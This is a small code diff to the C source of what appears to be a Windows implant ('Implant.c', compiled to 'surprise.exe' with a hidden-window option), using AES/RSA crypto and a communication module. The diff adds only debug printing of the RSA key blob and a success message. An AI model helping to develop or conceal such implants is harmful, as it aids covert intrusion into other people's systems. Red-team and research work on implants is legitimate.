@@ -1,6 +1,8 @@
 #include "implant.h"
 #include "AES.h"
 #include "Communication.h"
+#include <stdio.h>
+
 
 // Compilation command: x86_64-w64-mingw32-gcc Implant.c -o surprise.exe -lws2_32 -lbcrypt -s
 // futiv command : x86_64-w64-mingw32-gcc Implant.c -o surprise.exe -lws2_32 -lbcrypt -mwindows -s
@@ -222,6 +224,11 @@ int main()
         return 0;
     }
 
+
+
+
+    printf("%s\n", (char *)rsaPbinput);
+
     status = BCryptImportKeyPair(
         rsaAlgorithm,
         NULL,
@@ -230,6 +237,8 @@ int main()
         rsaPbinput,
         rsaBlobLen,
         0);
+
+
     if (!BCRYPT_SUCCESS(status))
     {
         HeapFree(GetProcessHeap(), 0, rsaPbinput);
@@ -240,7 +249,7 @@ int main()
         BCryptCloseAlgorithmProvider(aesAlgorithm, 0);
         BCryptCloseAlgorithmProvider(rsaAlgorithm, 0);
         return 0;
-    }
+    }else printf("key imported !");
 
     HeapFree(GetProcessHeap(), 0, rsaPbinput);
     rsaPbinput = NULL;
